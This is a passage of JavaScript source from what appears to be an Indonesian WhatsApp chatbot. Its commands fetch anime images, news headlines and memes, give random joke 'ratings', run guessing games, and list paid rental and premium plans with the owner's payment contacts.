if (isBan) throw sticBanLu(from)
if (!args.join(" ")) return m.reply("Text?")
tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
Infoo = tes.info
Detek = tes.translate
m.reply(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
}
break
//=================================================//
case 'bully': case 'waifu': case 'cuddle': case 'neko': case 'cry': case 'kiss': case 'hug': case 'awoo': case 'lick': {
if (isBan) throw sticBanLu(from)
let anu = await getBuffer(`https://yx-api.herokuapp.com/api/sfw/${command}`)
rikibos.sendMessage(m.chat, { image: anu, caption: `NihKak` }, { quoted: m})
}
break
//=================================================//
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (isBan) throw sticBanLu(from)
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
rikibos.sendImage(m.chat, data.url, mess.success, m)
})
break
//=================================================//
//=================================================//
case 'darkjoke':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/asupan/darkjoke?APIKEY=apivproject`)
rikibos.sendMessage(m.chat, { image: anu, caption: `Beliau ini....` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'meme':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme?APIKEY=apivproject`)
rikibos.sendMessage(m.chat, { image: anu, caption: `Bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'meme2':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme2?APIKEY=apivproject`)
rikibos.sendMessage(m.chat, { image: anu, caption: `bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'ss': case 'ssweb': {
if (isBan) throw sticBanLu(from)
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(mess.endLimit)
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
rikibos.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted: m }).catch((err) => m.reply(jsonformat('*error*')))
}
break
//=================================================//
case 'fajar-news':
if (isBan) throw sticBanLu(from)
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case "quotes":
if (isBan) throw sticBanLu(from)
var res = await Quotes()
teks += `\nAuthor: ${res.author}\n`
teks += `\nQuotes:\n`
teks += `${res.quotes}\n`
teks += ""
reply(teks)
break
//=================================================//
case "darkjoke": case "darkjokes":
if (isBan) throw sticBanLu(from)
var res = await Darkjokes()
teks = "*Darkjokes*"
rikibos.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : rik })
break
//=================================================//
case 'cnn-news':
if (isBan) throw sticBanLu(from)
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'layarkaca-search':
if (isBan) throw sticBanLu(from)
if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
break
//=================================================//
case 'cnbc-news':
if (isBan) throw sticBanLu(from)
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
rikibos.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : rik })
})
break
//=================================================//
case 'tribun-news':
if (isBan) throw sticBanLu(from)
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
rikibos.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : rik })
})
break
//=================================================//
case 'indozone-news':
if (isBan) throw sticBanLu(from)
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
rikibos.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : rik })
})
break
//=================================================//
case 'kompas-news':
if (isBan) throw sticBanLu(from)
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
rikibos.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : rik })
})
break
//=================================================//
case 'detik-news':
if (isBan) throw sticBanLu(from)
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
rikibos.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : rik })
})
break
//=================================================//
case 'daily-news':
if (isBan) throw sticBanLu(from)
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
rikibos.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : rik })
})
break
//=================================================//
case 'inews-news':
if (isBan) throw sticBanLu(from)
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'okezone-news':
if (isBan) throw sticBanLu(from)
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
rikibos.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : rik })
})
break
//=================================================//
case 'sindo-news':
if (isBan) throw sticBanLu(from)
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'tempo-news':
if (isBan) throw sticBanLu(from)
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
rikibos.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : rik })
})
break
//=================================================//
case 'antara-news':
if (isBan) throw sticBanLu(from)
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
rikibos.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : rik })
})
break
//=================================================//
case "kontan-news":
if (isBan) throw sticBanLu(from)
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
rikibos.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : rik })
})
break
//=================================================//
case "merdeka-news":
if (isBan) throw sticBanLu(from)
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
rikibos.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : rik })
})
break
//=================================================//
case "jalantikus-meme":
if (isBan) throw sticBanLu(from)
var res = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${res}`
teks += ""
rikibos.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : rik })
break
//=================================================//
/*Random*/
 case 'apakah':
 if (isBan) throw sticBanLu(from)
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
rikibos.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: rik })
break
//=================================================//
case 'bisakah':
if (isBan) throw sticBanLu(from)
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
rikibos.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: rik })
break
//=================================================//
case 'bagaimanakah':
if (isBan) throw sticBanLu(from)
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
rikibos.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: rik })
break
//=================================================//
case 'rate':
if (isBan) throw sticBanLu(from)
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const te = ra[Math.floor(Math.random() * ra.length)]
rikibos.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: rik })
break
//=================================================//
case 'gantengcek':
case 'cekganteng':
if (isBan) throw sticBanLu(from)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} rikibos`)
const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const teng = gan[Math.floor(Math.random() * gan.length)]
rikibos.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: rik })
break
//=================================================//
case 'cantikcek':
case 'cekcantik':
if (isBan) throw sticBanLu(from)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} rikibos`)
const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const tik = can[Math.floor(Math.random() * can.length)]
rikibos.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: rik })
break
//=================================================//
case 'sangecek':
case 'ceksange':
case 'gaycek':
case 'cekgay':
case 'lesbicek':
case 'ceklesbi':
if (isBan) throw sticBanLu(from)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
rikibos.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: rik })
break
//=================================================//
case 'kapankah':
if (isBan) throw sticBanLu(from)
if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
rikibos.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: rik })
break
//=================================================//
case 'wangy':
if (isBan) throw sticBanLu(from)
if (!q) return reply (`Contoh : .wangy rikibos`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
 reply(awikwok)
break
//=================================================//
case 'cekmati':
if (isBan) throw sticBanLu(from)
if (!q) return reply(`Invalid!\n\nYg mau di cek siapa kontol?`)
predea = await axios.get(`https://api.agify.io/?name=${q}`)
reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
break
//=================================================//
//=================================================//
case 'delttc': case 'delttt': {
if (isBan) throw sticBanLu(from)
this.game = this.game ? this.game : {}
try {
if (this.game) {
delete this.game
rikibos.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
} else if (!this.game) {
reply(`Session TicTacToe🎮 tidak ada`)
} else throw '?'
} catch (e) {
reply('rusak')
}
}
break
//=================================================//
case 'suitpvp': case 'suit': {
if (isBan) throw sticBanLu(from)
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_
@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit
Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await rikibos.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) rikibos.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
//=================================================//
case 'sewa':
if (!m.key.fromMe && !isCreator) return replyNya(mess.owner)
if (!m.isGroup) return replyNya(mess.group)
if (!q) return replyNya(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
if (args[0].toLowerCase() === 'add'){
_sewa.addSewaGroup(from, args[1], sewa)
replyNya(mess.success)
} else if (args[0].toLowerCase() === 'del'){
sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
fs.writeFileSync('./rikilah/Database/sewa.json', JSON.stringify(sewa))
replyNya(mess.success)
} else {
replyNya(`Penggunaan :\n*${prefix}sewa* add/del waktu`)}
break
case 'listsewa':
if (!m.isGroup) return replyNya(mess.group)
let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
for (let i of sewa){
let cekvippsewa = ms(i.expired - Date.now())
txtnyee += `*ID :* ${i.id} \n*Expire :* ${cekvippsewa.days} day(s) ${cekvippsewa.hours} hour(s) ${cekvippsewa.minutes} minute(s) ${cekvippsewa.seconds} second(s)\n\n`
}
replyNya(txtnyee)
break
case 'ceksewa': 
if (!m.isGroup) return replyNya(mess.group)
if (!isSewa) return replyNya(`Group Ini Tidak Terdaftar Dalam List Sewabot. Ketik ${prefix}sewabot Untuk Info Lebih Lanjut`)
let cekvipsewa = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
let sewanya = `*「 SEWA EXPIRE 」*\n\n➸ *ID*: ${from}\n➸ *Expired :* ${cekvipsewa.days} day(s) ${cekvipsewa.hours} hour(s) ${cekvipsewa.minutes} minute(s) ${cekvipsewa.seconds} second(s)`
reply(sewanya)
break
case 'buypremium': case 'sewabot': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
sewbot = `Hai *${pushname}*

𝐋𝐈𝐒𝐓 𝐒𝐄𝐖𝐀𝐁𝐎𝐓
7k/Minggu
20k/Bulan
Note : *Keuntungan Sewabot?*
Bisa Masukin Bot Ke Group

𝐋𝐈𝐒𝐓 𝐏𝐑𝐄𝐌𝐈𝐔𝐌
10k/Minggu
50k/Bulan
Note : *Keuntungan Premium?*
Bisa Gunain Fitur Premium Tanpa Batas

𝐋𝐈𝐒𝐓 𝐒𝐄𝐖𝐀𝐁𝐎𝐓 & 𝐏𝐑𝐄𝐌𝐈𝐔𝐌
17k/Minggu
70k/Bulan
Note : *Keuntungan Sewabot & Premium?*
Bisa Masukin Bot Ke Group & Bisa Gunain Fitur Premium Tanpa Batas

𝐋𝐈𝐒𝐓 𝐏𝐀𝐘𝐌𝐄𝐍𝐓
GOPAY : 0877-4109-7274
DANA : 085892832640
QRIS ALL : Scan Di Atas

Note : MAU SEWA & PREM KAK
SANGAT MUDAH KAK
Jika Sudah Membayar Silahkan Kirim Bukti Screenshot Ke Button Url Di Bawah`
let message = await prepareWAMessageMedia({ image: fs.readFileSync('./rikilah/foto/pay.jpg') }, { upload: rikibos.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: sewbot,
hydratedFooterText: ' 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳',
hydratedButtons: [
{
urlButton: {
displayText: 'OWNER RIK- OOHz',
url: 'https://wa.me/6287741097274'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'payment': case 'donasi': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
donte = `_MAU BAYAR YA KAK_
PULSA : 0877-4109-7274
QRIS ALL : Scan Di Atas

*NOTE :*
MAU BAYAR APA LIAT KAK
JIKA SUDAH BAYAR KIRIM BUKTI 
SCREENSHOT KE NOMOR OWNER`
let message = await prepareWAMessageMedia({ image: fs.readFileSync('./rikilah/foto/pay.jpg') }, { upload: rikibos.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: donte,
hydratedFooterText: ' 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳',
hydratedButtons: [{
urlButton: {
displayText: '𝐆𝐈𝐓𝐇𝐔𝐁',
url: 'https://github.com/KATANABOT'
}
},
{
urlButton: {
displayText: '𝐎𝐖𝐍𝐄𝐑',
url: 'https://wa.me/6287741097274'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'instagram': {
if (isBan) throw sticBanLu(from)
reply(' IG : https://www.instagram.com/ryarllh_01/')
}
break
case 'assalamualaikum': {
if (isBan) throw sticBanLu(from)
reply('وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ')
}
break
case 'halo': {
if (isBan) throw sticBanLu(from)
reply('halo juga kak')
}
break
case 'misi': {
if (isBan) throw sticBanLu(from)
reply('iya kak')
}
break
case 'punten': {
if (isBan) throw sticBanLu(from)
reply('iya kak')
}
break
case 'hai': {
if (isBan) throw sticBanLu(from)
reply('hai juga')
}
break
//=================================================//
case 'chat': {
if (isBan) throw sticBanLu(from)
if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
if (args[0] === 'mute') {
rikibos.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'unmute') {
rikibos.chatModify({ mute: null }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'archive') {
rikibos.chatModify({archive: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
rikibos.chatModify({ archive: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'read') {
rikibos.chatModify({ markRead: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'unread') {
rikibos.chatModify({ markRead: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'delete') {
rikibos.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
}
break
//=================================================//
case 'family100': {
if (isBan) throw sticBanLu(from)
if ('family100'+m.chat in _family100) {
reply('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await rikibos.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
break
//=================================================//
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
if (isBan) throw sticBanLu(from)
if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break
//=================================================//
case 'tebak': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
if (args[0] === "lagu") {
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
let result = anu[Math.floor(Math.random() * anu.length)]
let msg = await rikibos.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: rik })
rikibos.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
rikibos.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, rikibos.user.name, m)
delete tebaklagu[m.sender.split('@')[0]]
}
} else if (args[0] === 'gambar') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
rikibos.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
rikibos.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, rikibos.user.name, m)
delete tebakgambar[m.sender.split('@')[0]]
}
} else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
rikibos.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
rikibos.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, rikibos.user.name, m)
delete tebakkata[m.sender.split('@')[0]]
}
} else if (args[0] === 'kalimat') {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
rikibos.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
rikibos.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, rikibos.user.name, m)
delete tebakkalimat[m.sender.split('@')[0]]
}
